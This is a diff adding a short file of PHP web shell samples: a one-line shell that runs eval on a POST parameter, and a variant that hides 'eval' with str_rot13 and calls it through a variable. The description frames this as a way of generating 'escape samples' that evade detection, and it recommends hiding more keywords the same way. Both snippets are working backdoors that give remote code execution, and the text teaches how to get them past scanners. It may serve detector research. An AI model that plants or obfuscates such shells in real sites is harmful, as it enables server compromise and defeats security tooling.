@@ -1,0 +1,15 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST['110']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php$a=str_rot13('riny');$a($_POST['110']);?>
+'''
+
+Description:
+
+The "eval" keyword in the original webshell is encrypted and hidden using the "str_rot13" character substitution encryption algorithm, and the "eval" function is called using the variable "$a". When generating escape samples, we can consider using str_rot13 to hide and encrypt more keywords.
